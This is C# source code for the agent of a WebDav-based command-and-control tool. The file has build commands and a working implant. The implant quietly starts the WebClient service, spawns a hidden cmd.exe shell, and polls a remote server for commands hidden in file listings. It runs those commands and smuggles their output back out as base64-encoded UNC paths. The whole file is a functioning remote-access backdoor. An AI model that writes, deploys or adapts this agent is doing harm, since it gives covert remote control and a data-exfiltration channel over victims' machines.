/*
Author: Arno0x0x, Twitter: @Arno0x0x

-------------------- x64 platform ----------------
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:agent.exe *.cs

Or, with debug information:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /define:DEBUG /out:agent_debug.exe *.cs

-------------------- x86 platform ----------------
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:agent.exe *.cs

Or, with debug information:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /define:DEBUG /out:agent_debug.exe *.cs
*/

using System;
using System.Threading;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;
using System.ServiceProcess;

namespace webdavc2
{
    //****************************************************************************************
    // Main class
    //****************************************************************************************
    public class C2_Agent
    {
		Process shellProcess = null; // The child process used for an interactive shell
        private static StringBuilder shellOutput = new StringBuilder();
		
    	//==================================================================================================
        // Main program function
        //==================================================================================================
        public static void Main(string[] args)
        {
			char[] padding =  { '=' };
			int chunkSize = 220;
			string serverName = String.Empty; // Name or IP of the remote WebDavC2 server
			int sleepTime = 2000; // Polling interval in milliseconds
            bool breakFlag = false; // Break flag used to exit the agent
			StringBuilder dataReceived; // All data received from the WebDavC2 server
			
			string request = String.Empty;
			string command = String.Empty;
			int requestLength;
			
            //---------------------------------------------------------------------
            // Check arguments have been passed
            if (args.Length == 1)
			{
                // Retrieve remote WebDavC2 server name or IP address
                serverName = "\\\\" + args[0];
			}
            else
            {
 #if (DEBUG)
                Console.WriteLine("[ERROR] Missing arguments");
#endif
				System.Environment.Exit(-1);
            }

			//---------------------------------------------------------------------
			// Check if the WebClient service is started. If not, try to start using the 'pushd' 
			// command as it allows an unprivileged user to start it
            ServiceController sc = new ServiceController("webclient");
            if ((sc.Status.Equals(ServiceControllerStatus.Stopped)) || (sc.Status.Equals(ServiceControllerStatus.StopPending)))
			{
				Process process = new Process();
				ProcessStartInfo startInfo = new ProcessStartInfo();
				startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
				startInfo.FileName = "cmd.exe";
				startInfo.Arguments = "/c pushd " + serverName + " & popd";
				process.StartInfo = startInfo;
				process.Start();
				process.WaitForExit(); // Wait for the command to complete in order for the WebClient service to be started
				sc.Refresh(); // Refresh service status
			}

			if ((sc.Status.Equals(ServiceControllerStatus.Stopped)) || (sc.Status.Equals(ServiceControllerStatus.StopPending)))
			{
#if (DEBUG)
				Console.WriteLine("[ERROR] WebClient service could not be started");
#endif

				System.Environment.Exit(-1);
			}
			
			//---------------------------------------------------------------------
            // Create an instance of the C2_Agent
            C2_Agent c2_agent = new C2_Agent();
			
			//---------------------------------------------------------------------
			// Spawn a subprocess for executing all commands
			c2_agent.runShell(String.Empty);

			//---------------------------------------------------------------------------------
            // Main loop
            //---------------------------------------------------------------------------------			
			while (!breakFlag)
			{
#if (DEBUG)
                Console.WriteLine("[Main loop] Going to sleep for " + sleepTime / 1000 + " seconds");
#endif

				// Wait for the polling period to time out
                Thread.Sleep(sleepTime);
#if (DEBUG)
                Console.WriteLine("[Main loop] Waking up");
#endif

				//---------------------------------------------------------------------
				// Is there any command output to send back to the WebDavC2 server ?
				int currentLength = shellOutput.Length;
				if (currentLength > 0)
				{
					string output = shellOutput.ToString(0, currentLength);
					shellOutput.Remove(0, currentLength);
					
					// Convert the command output into a base64 string and then remove all characters that are not suitable in a URL ('+' and '/' as well as the base64 padding)
					string url = Convert.ToBase64String(Encoding.UTF8.GetBytes(output)).TrimEnd(padding).Replace('+','-').Replace('/','_');
					
					// If the result is too long (The fully qualified file name must be less than 260 characters, and the directory name must be less than 248 characters)
					if (url.Length > chunkSize) {
						int nbChunks = url.Length / chunkSize;
						
						if (nbChunks > 99) {
							request = serverName + "\\r00\\" + Convert.ToBase64String(Encoding.UTF8.GetBytes("Command output is too big !")).TrimEnd(padding).Replace('+','-').Replace('/','_');
							Directory.EnumerateFiles(request, "*.*");
						}
						else {
							string chunk = String.Empty;
							for (int i = 0; i <= nbChunks; i++) {
								chunk = (i != nbChunks) ?  url.Substring(i*chunkSize, chunkSize) : url.Substring(i*chunkSize);
								request = serverName + "\\r" + (nbChunks-i).ToString("00") + "\\" + chunk;
								Directory.EnumerateFiles(request, "*.*");
							}
						}
					}
					else {
						// Send the result back to the WebDavC2 server in the form of a WebDav request
						request = serverName + "\\r00\\" + url;
						Directory.EnumerateFiles(request, "*.*");
					}
				}
               
#if (DEBUG)
                Console.WriteLine("[Main loop] Waking up");
#endif
				//---------------------------------------------------------------------
				// Check for a command to be executed
				request = serverName + "\\getcommand\\";
				requestLength = request.Length;
				dataReceived = new StringBuilder();
				
				//---------------------------------------------------------------------
				// Process the WebDav server response
				foreach (string file in Directory.EnumerateFiles(request, "*.*")) {
#if (DEBUG)
					Console.WriteLine("[Main loop] File name listed: [" + file + "]");
#endif				
					dataReceived.Append(file.Substring(requestLength));
				}
				
#if (DEBUG)
					Console.WriteLine("[Main loop] Concatenated received data: [" + dataReceived.ToString() + "]");
#endif
				command = Encoding.UTF8.GetString(Convert.FromBase64String(dataReceived.ToString().Replace("_","/")));

#if (DEBUG)				
				Console.WriteLine("Command to be executed: [" + command + "]");
#endif
				
				//---------------------------------------------------------------------------------------------------
				// Command routing
				//---------------------------------------------------------------------------------------------------
				switch (command)
				{
					case "exit":
						c2_agent.runShell(command);
						breakFlag = true;
						break;
					case "":
						break;
					default:
						// Send the command to the child process
                        c2_agent.runShell(command);
						break;
				}
			}
        }
		
		///==================================================================================================
        // This method runs a command in a spawned child process (powershell.exe). The child process is
        // kept alive until it is explicitely exited. This allows for contextual commands and persistent
        // environment between commands.
        //==================================================================================================
        private void runShell(string command)
        {
            try
            {
                // Check if we already have a shell child process running
                // If not, start it and create the output and error data received callback
                if (shellProcess == null) {

#if (DEBUG)
                    Console.WriteLine("[runShellCmd] Spawning a child process");
#endif

                    ProcessStartInfo procStartInfo = new ProcessStartInfo();
                    procStartInfo.UseShellExecute = false;
                    procStartInfo.RedirectStandardInput = true;
                    procStartInfo.RedirectStandardOutput = true;
                    procStartInfo.RedirectStandardError = true;
                    procStartInfo.FileName = "cmd.exe";
                    //procStartInfo.Arguments = "\"-\"";
                    procStartInfo.CreateNoWindow = true;
                    procStartInfo.ErrorDialog = false;

                    shellProcess = new Process();
                    shellProcess.StartInfo = procStartInfo;
                    shellProcess.EnableRaisingEvents = true;

                    shellProcess.OutputDataReceived += (sender, e) =>
                    {
                        if (!String.IsNullOrEmpty(e.Data))
                        {
#if (DEBUG)
                            Console.WriteLine(e.Data);
#endif
                            shellOutput.Append(e.Data + "\n");
                        }
                    };

                    shellProcess.ErrorDataReceived += (sender, e) =>
                    {
                        if (!String.IsNullOrEmpty(e.Data))
                        {
#if (DEBUG)
                            Console.WriteLine(e.Data);
#endif
                            shellOutput.Append(e.Data + "\n");
                        }
                    };

                    shellProcess.Exited += (sender, e) =>
                    {
                        shellOutput.Clear();
                        shellProcess = null;
                    };

                    shellProcess.Start();
                    shellProcess.BeginOutputReadLine();
                    shellProcess.BeginErrorReadLine();
                }

                // Write the command to stdin
                shellProcess.StandardInput.WriteLine(command);
            }
            catch (Exception ex)
            {
                // Log the exception
#if (DEBUG)
                while (ex != null)
                {
                    Console.WriteLine("[ERROR] " + ex.Message);
                    ex = ex.InnerException;
                }
#endif
            }
        }
    }
}